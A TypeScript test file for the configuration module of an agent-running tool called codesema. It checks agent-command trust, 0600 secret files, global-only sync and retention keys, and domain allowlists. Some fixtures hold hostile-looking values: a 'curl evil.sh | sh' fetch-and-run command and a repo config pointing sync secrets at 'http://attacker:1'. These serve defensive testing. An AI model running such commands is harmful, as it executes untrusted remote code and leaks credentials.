import { mkdtempSync, rmSync, statSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, test } from 'bun:test'
import {
  globalConfigPath,
  hasInvalidPositiveIntKey,
  isRepoAgentTrusted,
  loadConfig,
  loadGlobalConfig,
  loadRepoConfig,
  presentRepoGlobalOnlyKeys,
  repoConfigPath,
  repoGlobalOnlyIgnoredNotices,
  resolveProjectAgentCommand,
  resolveProjectConfig,
  resolveReviewMode,
  resolveWatchdogBudgets,
  saveGlobalConfig,
  saveRepoConfig,
  trustedProjectAgentCommand,
  trustRepoAgent,
  trustStorePath,
  type CodesemaConfig,
} from './config.js'

describe('repo agent trust store', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-trust-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
  })

  test('an unknown command is not trusted', () => {
    expect(isRepoAgentTrusted('/repo', 'claude -p')).toBe(false)
  })

  test('the store lives in the global config dir', () => {
    expect(trustStorePath()).toBe(join(configDir, 'trusted-agents.json'))
  })

  test('a trusted command is remembered for that repo', () => {
    trustRepoAgent('/repo', 'claude -p')
    expect(isRepoAgentTrusted('/repo', 'claude -p')).toBe(true)
  })

  test('a changed command drops the trust (re-approval required)', () => {
    trustRepoAgent('/repo', 'claude -p')
    expect(isRepoAgentTrusted('/repo', 'curl evil.sh | sh')).toBe(false)
  })

  test('trust is scoped to the repo path', () => {
    trustRepoAgent('/repo-a', 'claude -p')
    expect(isRepoAgentTrusted('/repo-b', 'claude -p')).toBe(false)
  })
})

describe('sync credentials round-trip', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-sync-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
  })

  test('sync fields survive save and load', () => {
    saveGlobalConfig({
      syncUrl: 'http://localhost:9080',
      syncWorkspaceId: 'ws-1',
      syncSecret: 's3cret',
      syncAutoPush: true,
    })
    expect(loadGlobalConfig()).toEqual({
      syncUrl: 'http://localhost:9080',
      syncWorkspaceId: 'ws-1',
      syncSecret: 's3cret',
      syncAutoPush: true,
    })
  })

  test('a full rewrite (toggling one field) keeps the other global fields', () => {
    saveGlobalConfig({
      syncUrl: 'http://localhost:9080',
      syncWorkspaceId: 'ws-1',
      syncSecret: 's3cret',
    })

    // Toggle a single field the way a setter would: reload, flip it, hand the
    // whole config back to saveGlobalConfig (full file rewrite).
    saveGlobalConfig({ ...loadGlobalConfig(), syncAutoPush: true })

    const reloaded = loadGlobalConfig()
    expect(reloaded.syncUrl).toBe('http://localhost:9080')
    expect(reloaded.syncWorkspaceId).toBe('ws-1')
    expect(reloaded.syncAutoPush).toBe(true)
  })

  test('unknown or empty sync fields are dropped on load', () => {
    saveGlobalConfig({ syncWorkspaceId: '' } as CodesemaConfig)
    expect(loadGlobalConfig()).toEqual({})
  })

  test('the global config file is written owner-only (0600)', () => {
    saveGlobalConfig({ syncSecret: 's3cret' })
    expect(statSync(globalConfigPath()).mode & 0o777).toBe(0o600)
  })

  test('a pre-existing lax config file is re-tightened on save', () => {
    writeFileSync(globalConfigPath(), '{}\n', { mode: 0o644 })
    expect(statSync(globalConfigPath()).mode & 0o777).toBe(0o644)
    saveGlobalConfig({ syncSecret: 's3cret' })
    expect(statSync(globalConfigPath()).mode & 0o777).toBe(0o600)
  })
})

describe('sync fields are global-only', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string
  let repoDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-scope-'))
    repoDir = mkdtempSync(join(tmpdir(), 'codesema-repo-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
    rmSync(repoDir, { recursive: true, force: true })
  })

  test('sync fields in a repo config are ignored on load', () => {
    saveRepoConfig(repoDir, {
      agent: 'claude -p',
      syncUrl: 'http://attacker:1',
      syncWorkspaceId: 'ws-x',
      syncSecret: 'stolen',
      syncAutoPush: true,
    })
    expect(loadRepoConfig(repoDir)).toEqual({ agent: 'claude -p' })
  })

  test('a repo config cannot override the global sync destination', () => {
    saveGlobalConfig({ syncUrl: 'http://global:1', syncWorkspaceId: 'ws-1', syncSecret: 's3cret' })
    saveRepoConfig(repoDir, { syncUrl: 'http://attacker:1' })
    expect(loadConfig(repoDir)).toMatchObject({
      syncUrl: 'http://global:1',
      syncWorkspaceId: 'ws-1',
      syncSecret: 's3cret',
    })
  })
})

describe('isolation configuration', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string
  let repoDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-iso-cfg-'))
    repoDir = mkdtempSync(join(tmpdir(), 'codesema-iso-repo-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
    rmSync(repoDir, { recursive: true, force: true })
  })

  test('the three modes survive a round-trip, in either scope', () => {
    for (const isolation of ['auto', 'container', 'policy'] as const) {
      saveRepoConfig(repoDir, { isolation })
      expect(loadRepoConfig(repoDir).isolation).toBe(isolation)
    }
    saveGlobalConfig({ isolation: 'container' })
    expect(loadGlobalConfig().isolation).toBe('container')
    // Repo wins over global, like every other field.
    saveRepoConfig(repoDir, { isolation: 'policy' })
    expect(loadConfig(repoDir).isolation).toBe('policy')
  })

  test('an unknown mode is simply absent (the caller applies its own default)', () => {
    saveRepoConfig(repoDir, { isolation: 'vm' as never })
    expect(loadRepoConfig(repoDir).isolation).toBeUndefined()
  })

  test('the allowlist keeps hostnames, drops everything that is not one', () => {
    saveRepoConfig(repoDir, {
      isolationAllowedDomains: [
        'api.anthropic.com',
        'API.Anthropic.com',
        'registry.npmjs.org',
        'evil.com/../x',
        'no spaces.com',
        '',
        42 as never,
      ],
    })
    expect(loadRepoConfig(repoDir).isolationAllowedDomains).toEqual([
      'api.anthropic.com',
      'registry.npmjs.org',
    ])
  })

  test('an allowlist that is not a list of domains is absent, never half-applied', () => {
    saveRepoConfig(repoDir, { isolationAllowedDomains: 'api.anthropic.com' as never })
    expect(loadRepoConfig(repoDir).isolationAllowedDomains).toBeUndefined()
    saveRepoConfig(repoDir, { isolationAllowedDomains: ['!!!'] })
    expect(loadRepoConfig(repoDir).isolationAllowedDomains).toBeUndefined()
  })
})

describe('watchdog budgets (D3)', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string
  let repoDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-wd-cfg-'))
    repoDir = mkdtempSync(join(tmpdir(), 'codesema-wd-repo-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
    rmSync(repoDir, { recursive: true, force: true })
  })

  test('no configuration: 30 min, 2 h and 30 s (D3)', () => {
    expect(resolveWatchdogBudgets(loadConfig(repoDir))).toEqual({
      inactivityMs: 30 * 60_000,
      toolBudgetMs: 2 * 60 * 60_000,
      heartbeatMs: 30_000,
    })
  })

  test('the three budgets are readable from the config and override the defaults', () => {
    saveRepoConfig(repoDir, {
      watchdogInactivitySeconds: 600,
      watchdogToolBudgetSeconds: 5400,
      watchdogHeartbeatSeconds: 10,
    })
    const config = loadConfig(repoDir)
    expect(config.watchdogInactivitySeconds).toBe(600)
    expect(config.watchdogToolBudgetSeconds).toBe(5400)
    expect(config.watchdogHeartbeatSeconds).toBe(10)
    expect(resolveWatchdogBudgets(config)).toEqual({
      inactivityMs: 600_000,
      toolBudgetMs: 5_400_000,
      heartbeatMs: 10_000,
    })
  })

  test('a repo budget wins over the global one, field by field', () => {
    saveGlobalConfig({ watchdogInactivitySeconds: 60, watchdogHeartbeatSeconds: 5 })
    saveRepoConfig(repoDir, { watchdogInactivitySeconds: 120 })
    expect(resolveWatchdogBudgets(loadConfig(repoDir))).toEqual({
      inactivityMs: 120_000,
      toolBudgetMs: 2 * 60 * 60_000,
      heartbeatMs: 5_000,
    })
  })

  test('an unusable value falls back to its default rather than to a run cut on sight', () => {
    saveRepoConfig(repoDir, {
      watchdogInactivitySeconds: 0,
      watchdogToolBudgetSeconds: -1,
      watchdogHeartbeatSeconds: 1.5,
    })
    const config = loadRepoConfig(repoDir)
    expect(config.watchdogInactivitySeconds).toBeUndefined()
    expect(config.watchdogToolBudgetSeconds).toBeUndefined()
    expect(config.watchdogHeartbeatSeconds).toBeUndefined()
    expect(resolveWatchdogBudgets(config)).toEqual({
      inactivityMs: 30 * 60_000,
      toolBudgetMs: 2 * 60 * 60_000,
      heartbeatMs: 30_000,
    })
  })

  test('timeout gets the same guard: it is the last-resort ceiling now', () => {
    // Since T1.7 nothing else watches the wall clock, so a 0 or a negative
    // would read as "kill on sight" instead of "no ceiling".
    saveRepoConfig(repoDir, { timeout: 0 })
    expect(loadRepoConfig(repoDir).timeout).toBeUndefined()
    saveRepoConfig(repoDir, { timeout: -30 })
    expect(loadRepoConfig(repoDir).timeout).toBeUndefined()
    saveRepoConfig(repoDir, { timeout: 1.5 })
    expect(loadRepoConfig(repoDir).timeout).toBeUndefined()
    saveRepoConfig(repoDir, { timeout: 3600 })
    expect(loadRepoConfig(repoDir).timeout).toBe(3600)
  })

  // T1.9 review round 1, Mineur 5: taskRetentionCount's `>= 0` guard was one
  // of three surviving mutants — unlike timeout/maxParallelTasks, 0 here is
  // the OPPOSITE of "kill on sight": it is a legitimate, deliberate choice
  // ("keep none, purge every terminated task at the next boot"), so the
  // guard must accept 0 while still rejecting anything that would slice an
  // array with a negative or fractional count.
  //
  // T1.4 review A2 moved the key to GLOBAL-ONLY, so the value guard is now
  // pinned on the scope that can still carry it: the global file. The repo
  // scope is pinned by the test right below — this pair replaces the single
  // `loadRepoConfig` assertion this test used to make, which described a
  // contract that let a cloned repo purge every other project's work.
  test('taskRetentionCount on the GLOBAL file: 0 is a legitimate deliberate choice, negative/fractional fall back to the default', () => {
    saveGlobalConfig({ taskRetentionCount: 0 })
    expect(loadGlobalConfig().taskRetentionCount).toBe(0)
    saveGlobalConfig({ taskRetentionCount: 5 })
    expect(loadGlobalConfig().taskRetentionCount).toBe(5)
    saveGlobalConfig({ taskRetentionCount: -1 })
    expect(loadGlobalConfig().taskRetentionCount).toBeUndefined()
    saveGlobalConfig({ taskRetentionCount: 2.5 })
    expect(loadGlobalConfig().taskRetentionCount).toBeUndefined()
  })

  // The destructive half of T1.4 review A2, pinned on the merge every boot
  // actually performs: `applyRetention()` takes ONE keep count and applies it
  // to EVERY registered project, so a cloned repo that wrote
  // `taskRetentionCount: 0` used to purge the finished tasks — worktree, HOME
  // volume and .codesema/tasks/<id>/ — of all the OTHER projects at the next
  // boot. The repo value is now stripped, and NAMED (invariant 2).
  test('taskRetentionCount is GLOBAL-ONLY: a repo file cannot decide how long other projects keep their tasks', () => {
    saveGlobalConfig({ taskRetentionCount: 20 })
    saveRepoConfig(repoDir, { taskRetentionCount: 0 })
    expect(loadRepoConfig(repoDir).taskRetentionCount).toBeUndefined()
    // What `workspace()` actually feeds `createTaskManager`.
    expect(loadConfig(repoDir).taskRetentionCount).toBe(20)
    const resolved = resolveProjectConfig(repoDir)
    expect(resolved.config.taskRetentionCount).toBe(20)
    expect(resolved.warnings.some((line) => line.includes('taskRetentionCount'))).toBe(true)
    // Even a value the parser would have kept is ignored: presence is what is
    // warned about, not usability.
    saveRepoConfig(repoDir, { taskRetentionCount: 3 })
    expect(loadConfig(repoDir).taskRetentionCount).toBe(20)
    expect(presentRepoGlobalOnlyKeys(repoDir)).toEqual(['taskRetentionCount'])
  })

  test('a budget that is not a number at all is simply absent', () => {
    saveRepoConfig(repoDir, { watchdogInactivitySeconds: '600' as never })
    expect(loadRepoConfig(repoDir).watchdogInactivitySeconds).toBeUndefined()
  })
})

describe('machine load cap keys (T1.3, D4)', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string
  let repoDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-cap-cfg-'))
    repoDir = mkdtempSync(join(tmpdir(), 'codesema-cap-repo-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
    rmSync(repoDir, { recursive: true, force: true })
  })

  test('maxConcurrentAgents survives a GLOBAL round-trip, integer >= 1 only', () => {
    saveGlobalConfig({ maxConcurrentAgents: 6 })
    expect(loadGlobalConfig().maxConcurrentAgents).toBe(6)
    saveGlobalConfig({ maxConcurrentAgents: 0 })
    expect(loadGlobalConfig().maxConcurrentAgents).toBeUndefined()
    saveGlobalConfig({ maxConcurrentAgents: -1 })
    expect(loadGlobalConfig().maxConcurrentAgents).toBeUndefined()
    saveGlobalConfig({ maxConcurrentAgents: 1.5 })
    expect(loadGlobalConfig().maxConcurrentAgents).toBeUndefined()
  })

  test('the deprecated maxParallelTasks still round-trips on the GLOBAL file', () => {
    saveGlobalConfig({ maxParallelTasks: 2 })
    expect(loadGlobalConfig().maxParallelTasks).toBe(2)
  })

  test('both keys can coexist on the GLOBAL file: loadConfig hands both back, the caller picks', () => {
    saveGlobalConfig({ maxParallelTasks: 2, maxConcurrentAgents: 5 })
    const config = loadConfig(repoDir)
    expect(config.maxParallelTasks).toBe(2)
    expect(config.maxConcurrentAgents).toBe(5)
  })

  test('a repo file that sets either key is stripped (T1.4: global-only)', () => {
    saveGlobalConfig({ maxConcurrentAgents: 4 })
    saveRepoConfig(repoDir, { maxParallelTasks: 2, maxConcurrentAgents: 9, agent: 'claude -p' })
    expect(loadRepoConfig(repoDir)).toEqual({ agent: 'claude -p' })
    expect(loadConfig(repoDir).maxConcurrentAgents).toBe(4)
    expect(loadConfig(repoDir).maxParallelTasks).toBeUndefined()
  })

  // MINEUR (adversarial review): parseConfig drops an unusable value in
  // silence — same doctrine as every other numeric key — but the machine cap
  // is the one place a CALLER (workspace.ts) wants to know it happened, so
  // this is the seam that tells "present and wrong" from "absent".
  describe('hasInvalidPositiveIntKey', () => {
    test('absent is not invalid: nothing to warn about', () => {
      saveRepoConfig(repoDir, {})
      expect(hasInvalidPositiveIntKey(repoConfigPath(repoDir), 'maxConcurrentAgents')).toBe(false)
    })

    test('a usable value is not invalid', () => {
      saveRepoConfig(repoDir, { maxConcurrentAgents: 3 })
      expect(hasInvalidPositiveIntKey(repoConfigPath(repoDir), 'maxConcurrentAgents')).toBe(false)
    })

    test('0, negative, fractional and non-numeric are all invalid', () => {
      for (const bad of [0, -1, 1.5, 'quatre' as unknown as number]) {
        saveRepoConfig(repoDir, { maxConcurrentAgents: bad })
        expect(hasInvalidPositiveIntKey(repoConfigPath(repoDir), 'maxConcurrentAgents')).toBe(true)
      }
    })

    test('the deprecated alias gets the same treatment', () => {
      saveRepoConfig(repoDir, { maxParallelTasks: -2 })
      expect(hasInvalidPositiveIntKey(repoConfigPath(repoDir), 'maxParallelTasks')).toBe(true)
    })

    test('a path with no file at all is not invalid — nothing was ever typed', () => {
      expect(
        hasInvalidPositiveIntKey(join(repoDir, 'nope', 'config.json'), 'maxConcurrentAgents'),
      ).toBe(false)
    })
  })
})

describe('resolveProjectConfig (T1.4)', () => {
  const previousConfigDir = process.env.CODESEMA_CONFIG_DIR
  let configDir: string
  let repoDir: string

  beforeEach(() => {
    configDir = mkdtempSync(join(tmpdir(), 'codesema-proj-cfg-'))
    repoDir = mkdtempSync(join(tmpdir(), 'codesema-proj-repo-'))
    process.env.CODESEMA_CONFIG_DIR = configDir
  })

  afterEach(() => {
    if (previousConfigDir === undefined) {
      delete process.env.CODESEMA_CONFIG_DIR
    } else {
      process.env.CODESEMA_CONFIG_DIR = previousConfigDir
    }
    rmSync(configDir, { recursive: true, force: true })
    rmSync(repoDir, { recursive: true, force: true })
  })

  test('repo timeout wins over global', () => {
    saveGlobalConfig({ timeout: 900 })
    saveRepoConfig(repoDir, { timeout: 300 })
    expect(resolveProjectConfig(repoDir).config.timeout).toBe(300)
  })

  test('a CLI flag wins over the repo file', () => {
    saveRepoConfig(repoDir, { isolation: 'policy', timeout: 300 })
    const resolved = resolveProjectConfig(repoDir, { isolation: 'container', timeout: 60 })
    expect(resolved.config.isolation).toBe('container')
    expect(resolved.config.timeout).toBe(60)
  })

  test('outside any repo, only the global file (and flags) apply', () => {
    saveGlobalConfig({ timeout: 900, isolation: 'policy' })
    saveRepoConfig(repoDir, { timeout: 300, isolation: 'container' })
    expect(resolveProjectConfig(null).config).toMatchObject({ timeout: 900, isolation: 'policy' })
    expect(resolveProjectConfig(null, { timeout: 15 }).config.timeout).toBe(15)
  })

  test('a repo maxConcurrentAgents is ignored, the global cap stands, and a warning names the key', () => {
    saveGlobalConfig({ maxConcurrentAgents: 4 })
    saveRepoConfig(repoDir, { maxConcurrentAgents: 1 })
    const resolved = resolveProjectConfig(repoDir)
    expect(resolved.config.maxConcurrentAgents).toBe(4)
    expect(resolved.warnings.some((line) => line.includes('maxConcurrentAgents'))).toBe(true)
    expect(presentRepoGlobalOnlyKeys(repoDir)).toEqual(['maxConcurrentAgents'])
  })

  test('the review mode a project declares is what resolves (T3.2)', () => {
    saveRepoConfig(repoDir, { reviewMode: 'dual' })
    const resolved = resolveProjectConfig(repoDir)
    expect(resolved.config.reviewMode).toBe('dual')
    expect(resolveReviewMode(resolved.config)).toBe('dual')
  })

  test('a repo review mode wins over the global one, like every repo-settable key', () => {
    saveGlobalConfig({ reviewMode: 'dual' })
    saveRepoConfig(repoDir, { reviewMode: 'simple' })
    expect(resolveReviewMode(resolveProjectConfig(repoDir).config)).toBe('simple')
  })

  test('no review mode declared anywhere resolves to simple (non-regression)', () => {
    saveGlobalConfig({ timeout: 900 })
    saveRepoConfig(repoDir, { timeout: 300 })
    const resolved = resolveProjectConfig(repoDir)
    expect(resolved.config.reviewMode).toBeUndefined()
    expect(resolveReviewMode(resolved.config)).toBe('simple')
  })

  test('a review mode outside the enum is dropped without throwing, and simple stands', () => {
    // Written through saveRepoConfig so the directory exists, then hand-mangled
    // the way a human editing the file would.
    saveRepoConfig(repoDir, { timeout: 300 })
    writeFileSync(
      repoConfigPath(repoDir),
      JSON.stringify({ timeout: 300, reviewMode: 'triple' }),
      'utf8',
    )
    expect(() => resolveProjectConfig(repoDir)).not.toThrow()
    const resolved = resolveProjectConfig(repoDir)
    expect(resolved.config.reviewMode).toBeUndefined()
    expect(resolveReviewMode(resolved.config)).toBe('simple')
  })

  test('the deprecated alias in a repo file is named the same way', () => {
    saveRepoConfig(repoDir, { maxParallelTasks: 2 })
    const notices = repoGlobalOnlyIgnoredNotices(repoDir)
    expect(notices.some((line) => line.includes('maxParallelTasks'))).toBe(true)
    expect(repoGlobalOnlyIgnoredNotices(null)).toEqual([])
  })

  test('trustedProjectAgentCommand is scoped to the repo that provided the command', () => {
    trustRepoAgent(repoDir, 'claude -p --model opus')
    expect(trustedProjectAgentCommand(repoDir, 'claude -p --model opus')).toEqual({
      kind: 'trusted',
      command: 'claude -p --model opus',
    })
    expect(trustedProjectAgentCommand('/other-repo', 'claude -p --model opus')).toEqual({
      kind: 'untrusted',
      command: 'claude -p --model opus',
    })
    expect(trustedProjectAgentCommand(repoDir, undefined)).toEqual({ kind: 'none' })
  })

  test('resolveProjectAgentCommand TOFU-checks only the repo file, never the global agent', () => {
    saveGlobalConfig({ agent: 'codex exec -' })
    saveRepoConfig(repoDir, { agent: 'claude -p --model opus' })
    trustRepoAgent(repoDir, 'claude -p --model opus')
    expect(resolveProjectAgentCommand(repoDir, {}, 'fallback').command).toBe(
      'claude -p --model opus',
    )
    const other = mkdtempSync(join(tmpdir(), 'codesema-proj-other-'))
    expect(resolveProjectAgentCommand(other, {}, 'fallback')).toEqual({ command: 'codex exec -' })
    rmSync(other, { recursive: true, force: true })
  })

  test('a CLI --agent flag bypasses TOFU', () => {
    saveRepoConfig(repoDir, { agent: 'claude -p --model opus' })
    expect(resolveProjectAgentCommand(repoDir, { agent: 'codex exec -' }, 'fallback').command).toBe(
      'codex exec -',
    )
  })

  test('an untrusted repo agent falls back to global, with a warning', () => {
    saveGlobalConfig({ agent: 'codex exec -' })
    saveRepoConfig(repoDir, { agent: 'claude -p --model opus' })
    const resolved = resolveProjectAgentCommand(repoDir, {}, 'fallback')
    expect(resolved.command).toBe('codex exec -')
    expect(resolved.warning).toContain('claude -p --model opus')
  })
})
